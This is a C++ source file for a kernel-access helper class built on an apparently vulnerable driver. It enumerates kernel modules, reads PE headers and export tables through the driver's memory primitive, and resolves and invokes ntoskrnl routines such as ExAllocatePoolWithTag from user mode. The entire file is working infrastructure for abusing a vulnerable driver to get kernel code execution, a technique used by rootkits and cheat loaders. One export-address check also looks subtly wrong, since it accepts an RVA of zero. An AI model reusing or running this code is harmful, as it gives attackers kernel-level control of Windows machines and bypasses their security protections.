#include "kernel_context.hpp"

#include <scanner/pattern_scanner.hpp>

#include <windows.h>

#include <psapi.h>
#include <DbgHelp.h>

K32Context::K32Context(std::shared_ptr<BasicVulnDriver> driver)
    : driver(std::move(driver))
    , patternScanner(std::make_unique<PatternScanner>(driver))
{
}

K32Context::~K32Context()
{
}

const BasicVulnDriver& K32Context::GetDriver() const
{
    return *driver;
}

const PatternScanner& K32Context::GetPatternScanner() const
{
    return *patternScanner;
}

uintptr_t K32Context::AllocatePool(POOL_TYPE poolType, std::size_t size)
{
    static const auto exAllocPool = GetK32ExportProcAddr("ntoskrnl.exe", "ExAllocatePoolWithTag");
    if (!exAllocPool) {
        std::println("[-] Failed to get export proc address");
        return 0;
    }

    uintptr_t allocAddress = 0;
    if (!InvokeK32Routine(&allocAddress, exAllocPool, poolType, size, 'lnrk')) {
        std::println("[-] Failed to invoke kernel routine");
        return 0;
    }

    return allocAddress;
}

bool K32Context::FreePool(uintptr_t address)
{
    static const auto exFreePool = GetK32ExportProcAddr("ntoskrnl.exe", "ExFreePool");
    if (!exFreePool) {
        std::println("[-] Failed to get export proc address");
        return 0;
    }

    return InvokeK32Routine(exFreePool, address);
}

uintptr_t K32Context::GetK32ModuleAddr(std::string_view moduleName)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;

    if (!K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        std::println("[-] Failed to enumerate device drivers");
        return 0;
    }

    DWORD cDrivers = cbNeeded / sizeof(drivers[0]);

    for (DWORD i = 0; i < cDrivers; ++i) {
        char baseName[256];
        if (!K32GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName))) {
            continue;
        }

        if (baseName == moduleName) {
            std::println("[+] Module '{}' base address found: 0x{:X}", moduleName, reinterpret_cast<uintptr_t>(drivers[i]));
            return reinterpret_cast<uintptr_t>(drivers[i]);
        }
    }

    return 0;
}

size_t K32Context::GetK32ModuleSize(std::string_view moduleName)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;

    if (!K32EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
        std::println("[-] Failed to enumerate device drivers");
        return 0;
    }

    DWORD cDrivers = cbNeeded / sizeof(drivers[0]);

    for (DWORD i = 0; i < cDrivers; ++i) {
        char baseName[256];
        if (!K32GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName)))
            continue;

        if (_stricmp(baseName, moduleName.data()) != 0)
            continue;

        // Читаем DOS заголовок
        IMAGE_DOS_HEADER dosHeader { };
        if (!driver->ReadMemory(reinterpret_cast<uintptr_t>(drivers[i]), &dosHeader, sizeof(dosHeader)))
            continue;

        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
            continue;

        // Читаем NT заголовок
        IMAGE_NT_HEADERS64 ntHeaders { };
        if (!driver->ReadMemory(reinterpret_cast<uintptr_t>(drivers[i]) + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders)))
            continue;

        if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
            continue;

        const size_t imageSize = ntHeaders.OptionalHeader.SizeOfImage;
        std::println("[+] Module '{}' size found: 0x{:X}", moduleName, imageSize);
        return imageSize;
    }

    std::println("[-] Failed to get module size for '{}'", moduleName);
    return 0;
}

uintptr_t K32Context::GetK32ExportProcAddr(uintptr_t moduleBase, std::string_view functionName)
{
    IMAGE_DOS_HEADER dosHeader = { 0 };
    if (!driver->ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader))) {
        std::println("[-] Failed to read module DOS header");
        return 0;
    }

    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        std::println("[-] Invalid module DOS signature");
        return 0;
    }

    IMAGE_NT_HEADERS ntHeaders = { 0 };
    if (!driver->ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders))) {
        std::println("[-] Failed to read module NT headers");
        return 0;
    }

    if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
        std::println("[-] Invalid image NT signature");
        return 0;
    }

    const auto exDirSize = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    const auto exDirBaseAddr = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    PIMAGE_EXPORT_DIRECTORY exportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, exDirSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!exportDir) {
        std::println("[-] Failed to allocate memory for read kernel export directory");
        return 0;
    }

    if (!driver->ReadMemory(moduleBase + exDirBaseAddr, exportDir, exDirSize)) {
        std::println("[-] Failed to read module export directory");
        VirtualFree(exportDir, 0, MEM_RELEASE);
        return 0;
    }

    uintptr_t delta = reinterpret_cast<uintptr_t>(exportDir) - exDirBaseAddr;
    auto nameTable = reinterpret_cast<DWORD*>(exportDir->AddressOfNames + delta);
    auto ordinalTable = reinterpret_cast<WORD*>(exportDir->AddressOfNameOrdinals + delta);
    auto functionTable = reinterpret_cast<DWORD*>(exportDir->AddressOfFunctions + delta);

    uintptr_t functionAddr = 0;
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
        char* functionNamePtr = reinterpret_cast<char*>(nameTable[i] + delta);
        std::string currentName = functionNamePtr;

        if (currentName == functionName) {
            WORD ordinal = ordinalTable[i];
            DWORD functionRva = functionTable[ordinal];

            if (functionRva == 0 || functionRva > 0x1000) {
                functionAddr = moduleBase + functionRva;
                std::println("[+] Found '{}' at 0x{:X}", functionName, functionAddr);
            }
            break;
        }
    }

    VirtualFree(exportDir, 0, MEM_RELEASE);
    return functionAddr;
}

uintptr_t K32Context::GetK32ExportProcAddr(std::string_view moduleName, std::string_view functionName)
{
    const auto moduleBaseAddr = GetK32ModuleAddr(moduleName);
    if (!moduleBaseAddr) {
        std::println("[-] Failed to get module '{}' base address", moduleName);
        return 0;
    }

    return GetK32ExportProcAddr(moduleBaseAddr, functionName);
}